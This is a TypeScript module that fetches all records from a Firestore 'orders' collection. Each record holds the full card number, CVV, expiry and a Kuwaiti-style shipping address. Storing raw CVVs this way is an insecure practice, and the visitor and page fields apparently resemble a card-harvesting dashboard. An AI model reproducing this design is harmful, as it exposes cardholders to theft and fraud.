import { db } from "./firebase"
import { collection, getDocs, orderBy, query } from "firebase/firestore"

export interface OrderData {
  id: string
  createdAt: string
  pageName: string
  payment: {
    method: string
    status: string
  }
  values: {
    cardNumber: string
    cvv: string
    expiryDate: string
    paymentMethod: string
  }
  shipping: {
    area: string
    block: string
    fullName: string
    governorate: string
    house: string
    phone: string
    street: string
  }
  status: string
  visitor: string
}

export async function getNotifications(): Promise<OrderData[]> {
  const ordersRef = collection(db, "orders")
  const q = query(ordersRef, orderBy("createdAt", "desc"))
  const snapshot = await getDocs(q)

  return snapshot.docs.map((doc) => ({
    id: doc.id,
    ...doc.data(),
  })) as OrderData[]
}

